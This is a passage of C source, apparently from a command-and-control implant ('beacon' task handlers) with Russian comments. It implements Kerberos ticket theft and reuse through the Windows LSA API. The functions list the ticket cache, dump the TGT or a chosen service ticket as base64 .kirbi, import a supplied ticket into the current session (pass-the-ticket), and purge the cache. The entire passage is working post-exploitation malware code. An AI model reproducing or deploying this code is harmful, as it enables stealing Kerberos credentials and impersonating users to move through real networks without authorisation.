    *out_lsa = h;
    *out_pkg = pkg;
    return 0;
}

static void lsa_close(HANDLE h) {
    HMODULE m = GetModuleHandleA("secur32.dll");
    if (!m) return;
    fn_LsaDeregisterLogonProcess pDereg =
        (fn_LsaDeregisterLogonProcess)GetProcAddress(m, "LsaDeregisterLogonProcess");
    if (pDereg && h) pDereg(h);
}

static fn_LsaCallAuthenticationPackage get_call(void) {
    HMODULE m = GetModuleHandleA("secur32.dll");
    return m ? (fn_LsaCallAuthenticationPackage)
               GetProcAddress(m, "LsaCallAuthenticationPackage") : NULL;
}
static fn_LsaFreeReturnBuffer get_free(void) {
    HMODULE m = GetModuleHandleA("secur32.dll");
    return m ? (fn_LsaFreeReturnBuffer)
               GetProcAddress(m, "LsaFreeReturnBuffer") : NULL;
}

// ---- cmd_ticket_list -------------------------------------------------------

void cmd_ticket_list(const BeaconTask* t) {
    (void)t;
    HANDLE lsa = NULL; ULONG pkg = 0;
    if (lsa_connect(&lsa, &pkg) != 0) { out_str("error: LSA connect failed\n"); return; }

    KERB_QUERY_TKT_CACHE_REQUEST req = { 0 };
    req.MessageType = KerbQueryTicketCacheMessage;
    req.LogonId.LowPart = 0; req.LogonId.HighPart = 0;

    fn_LsaCallAuthenticationPackage pCall = get_call();
    fn_LsaFreeReturnBuffer          pFree = get_free();
    if (!pCall || !pFree) { lsa_close(lsa); out_str("error: secur32 procs missing\n"); return; }

    PKERB_QUERY_TKT_CACHE_RESPONSE resp = NULL;
    ULONG rsz = 0; NTSTATUS sub = 0;
    NTSTATUS s = pCall(lsa, pkg, &req, sizeof(req),
                       (PVOID*)&resp, &rsz, &sub);
    if (s < 0 || sub < 0 || !resp) {
        out_str("error: KerbQueryTicketCacheMessage failed\n");
        lsa_close(lsa); return;
    }

    char head[64]; int n = 0;
    const char p1[] = "tickets: ";
    for (size_t j = 0; j < sizeof(p1)-1; ++j) head[n++] = p1[j];
    n += fmt_u32(head + n, resp->CountOfTickets);
    head[n++] = '\n';
    out_write(head, (size_t)n);

    for (ULONG i = 0; i < resp->CountOfTickets; ++i) {
        KERB_TICKET_CACHE_INFO* ti = &resp->Tickets[i];
        char buf[64]; int p = 0;
        const char idx[] = "  ["; for (size_t j = 0; j < sizeof(idx)-1; ++j) buf[p++] = idx[j];
        p += fmt_u32(buf + p, i);
        buf[p++] = ']'; buf[p++] = ' ';
        out_write(buf, (size_t)p);
        // ServerName
        if (ti->ServerName.Buffer && ti->ServerName.Length)
            wide_to_utf8_out(ti->ServerName.Buffer, ti->ServerName.Length / sizeof(wchar_t));
        out_str(" @ ");
        if (ti->RealmName.Buffer && ti->RealmName.Length)
            wide_to_utf8_out(ti->RealmName.Buffer, ti->RealmName.Length / sizeof(wchar_t));
        // EncryptionType
        const char et[] = "  enc=";
        out_write(et, sizeof(et)-1);
        char num[16]; int nn = fmt_u32(num, (uint32_t)ti->EncryptionType);
        out_write(num, (size_t)nn);
        out_str("\n");
    }

    pFree(resp);
    lsa_close(lsa);
}

// ---- cmd_ticket_dump -------------------------------------------------------

// payload (KV): {service utf8}? — если задан, извлекается конкретный билет;
// иначе — TGT (krbtgt/REALM).
void cmd_ticket_dump(const BeaconTask* t) {
    HANDLE lsa = NULL; ULONG pkg = 0;
    if (lsa_connect(&lsa, &pkg) != 0) { out_str("error: LSA connect failed\n"); return; }

    fn_LsaCallAuthenticationPackage pCall = get_call();
    fn_LsaFreeReturnBuffer          pFree = get_free();
    if (!pCall || !pFree) { lsa_close(lsa); out_str("error: secur32 procs missing\n"); return; }

    // payload пока берём как UTF-8 SPN ("HTTP/host" / пусто = TGT).
    const uint8_t* svc = t->pay;
    uint32_t       svc_len = t->pay_len;

    // Размер запроса = sizeof(REQ) + utf-16 service.
    int wlen = 0;
    if (svc_len) {
        wlen = MultiByteToWideChar(CP_UTF8, 0, (LPCSTR)svc, (int)svc_len, NULL, 0);
        if (wlen <= 0) wlen = 0;
    }
    SIZE_T req_sz = sizeof(KERB_RETRIEVE_TKT_REQUEST) + (SIZE_T)wlen * sizeof(wchar_t);
    KERB_RETRIEVE_TKT_REQUEST* req = (KERB_RETRIEVE_TKT_REQUEST*)bcalloc(req_sz);
    if (!req) { lsa_close(lsa); out_str("error: alloc\n"); return; }

    req->MessageType    = KerbRetrieveEncodedTicketMessage;
    req->LogonId.LowPart = 0; req->LogonId.HighPart = 0;
    req->TicketFlags    = 0;
    req->CacheOptions   = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    req->EncryptionType = 0;
    req->CredentialsHandle.dwLower = 0;
    req->CredentialsHandle.dwUpper = 0;

    if (wlen > 0) {
        wchar_t* dst = (wchar_t*)((uint8_t*)req + sizeof(KERB_RETRIEVE_TKT_REQUEST));
        MultiByteToWideChar(CP_UTF8, 0, (LPCSTR)svc, (int)svc_len, dst, wlen);
        req->TargetName.Buffer        = dst;
        req->TargetName.Length        = (USHORT)(wlen * sizeof(wchar_t));
        req->TargetName.MaximumLength = req->TargetName.Length;
    }

    PKERB_RETRIEVE_TKT_RESPONSE resp = NULL;
    ULONG rsz = 0; NTSTATUS sub = 0;
    NTSTATUS s = pCall(lsa, pkg, req, (ULONG)req_sz,
                       (PVOID*)&resp, &rsz, &sub);
    bfree(req);
    if (s < 0 || sub < 0 || !resp) {
        out_str("error: KerbRetrieveEncodedTicketMessage failed\n");
        lsa_close(lsa); return;
    }

    uint8_t* blob = (uint8_t*)resp->Ticket.EncodedTicket;
    ULONG    blen = resp->Ticket.EncodedTicketSize;
    if (!blob || !blen) {
        out_str("error: empty ticket\n");
        pFree(resp); lsa_close(lsa); return;
    }

    // Кодируем .kirbi блоб в base64 без CRT.
    static const char b64t[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    ULONG out64_len = ((blen + 2) / 3) * 4;
    uint8_t* out64 = (uint8_t*)bmalloc((size_t)out64_len + 1);
    if (!out64) { pFree(resp); lsa_close(lsa); out_str("error: alloc b64\n"); return; }

    ULONG wi = 0;
    for (ULONG i = 0; i < blen; i += 3) {
        uint8_t b0 = blob[i];
        uint8_t b1 = (i + 1 < blen) ? blob[i + 1] : 0;
        uint8_t b2 = (i + 2 < blen) ? blob[i + 2] : 0;
        out64[wi++] = (uint8_t)b64t[b0 >> 2];
        out64[wi++] = (uint8_t)b64t[((b0 & 3) << 4) | (b1 >> 4)];
        out64[wi++] = (i + 1 < blen) ? (uint8_t)b64t[((b1 & 0xF) << 2) | (b2 >> 6)] : '=';
        out64[wi++] = (i + 2 < blen) ? (uint8_t)b64t[b2 & 0x3F] : '=';
    }
    out64[wi] = 0;

    out_str("kirbi:\n");
    out_write(out64, wi);
    out_str("\n");
    bfree(out64);
    pFree(resp);
    lsa_close(lsa);
}

// ---- cmd_ticket_use --------------------------------------------------------

// payload: base64-encoded .kirbi blob (KerbSubmitTicketMessage).
void cmd_ticket_use(const BeaconTask* t) {
    if (!t->pay || !t->pay_len) { out_str("error: no kirbi payload\n"); return; }

    HANDLE lsa = NULL; ULONG pkg = 0;
    if (lsa_connect(&lsa, &pkg) != 0) { out_str("error: LSA connect failed\n"); return; }

    fn_LsaCallAuthenticationPackage pCall = get_call();
    fn_LsaFreeReturnBuffer          pFree = get_free();
    if (!pCall || !pFree) { lsa_close(lsa); out_str("error: secur32 procs missing\n"); return; }

    // Декодируем base64 в бинарный .kirbi.
    static const int8_t dtab[256] = {
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
        52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,
        -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
        15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
        -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
        41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    };

    ULONG bin_max = (t->pay_len * 3) / 4 + 4;
    uint8_t* bin = (uint8_t*)bmalloc((size_t)bin_max);
    if (!bin) { lsa_close(lsa); out_str("error: alloc\n"); return; }

    ULONG bin_len = 0;
    const uint8_t* src = t->pay;
    uint32_t src_len = t->pay_len;
    for (uint32_t i = 0; i + 3 < src_len; i += 4) {
        int8_t a = dtab[src[i]],     b = dtab[src[i+1]];
        int8_t c = dtab[src[i+2]],   d = dtab[src[i+3]];
        if (a < 0 || b < 0) break;
        bin[bin_len++] = (uint8_t)((a << 2) | (b >> 4));
        if (src[i+2] != '=' && c >= 0) bin[bin_len++] = (uint8_t)((b << 4) | (c >> 2));
        if (src[i+3] != '=' && d >= 0) bin[bin_len++] = (uint8_t)((c << 2) | d);
    }

    SIZE_T req_sz = sizeof(KERB_SUBMIT_TKT_REQUEST) + bin_len;
    KERB_SUBMIT_TKT_REQUEST* req = (KERB_SUBMIT_TKT_REQUEST*)bcalloc(req_sz);
    if (!req) { bfree(bin); lsa_close(lsa); out_str("error: alloc req\n"); return; }

    req->MessageType     = KerbSubmitTicketMessage;
    req->LogonId.LowPart = 0; req->LogonId.HighPart = 0;
    req->KerbCredSize    = bin_len;
    req->KerbCredOffset  = sizeof(KERB_SUBMIT_TKT_REQUEST);
    rt_memcpy((uint8_t*)req + sizeof(KERB_SUBMIT_TKT_REQUEST), bin, bin_len);
    bfree(bin);

    PVOID out_buf = NULL; ULONG out_sz = 0; NTSTATUS sub = 0;
    NTSTATUS s = pCall(lsa, pkg, req, (ULONG)req_sz,
                       &out_buf, &out_sz, &sub);
    bfree(req);
    if (out_buf) pFree(out_buf);
    lsa_close(lsa);

    if (s < 0 || sub < 0) { out_str("error: KerbSubmitTicketMessage failed\n"); return; }
    out_str("ticket imported into current session\n");
}

// ---- cmd_ticket_purge ------------------------------------------------------

void cmd_ticket_purge(const BeaconTask* t) {
    (void)t;
    HANDLE lsa = NULL; ULONG pkg = 0;
    if (lsa_connect(&lsa, &pkg) != 0) { out_str("error: LSA connect failed\n"); return; }

    fn_LsaCallAuthenticationPackage pCall = get_call();
    fn_LsaFreeReturnBuffer          pFree = get_free();
    if (!pCall || !pFree) { lsa_close(lsa); out_str("error: secur32 procs missing\n"); return; }

    KERB_PURGE_TKT_CACHE_REQUEST req = { 0 };
    req.MessageType      = KerbPurgeTicketCacheMessage;
    req.LogonId.LowPart  = 0; req.LogonId.HighPart = 0;

    PVOID out_buf = NULL; ULONG out_sz = 0; NTSTATUS sub = 0;
    NTSTATUS s = pCall(lsa, pkg, &req, sizeof(req),
                       &out_buf, &out_sz, &sub);
    if (out_buf) pFree(out_buf);
    lsa_close(lsa);

    if (s < 0 || sub < 0) { out_str("error: KerbPurgeTicketCacheMessage failed\n"); return; }
    out_str("Kerberos ticket cache purged\n");
}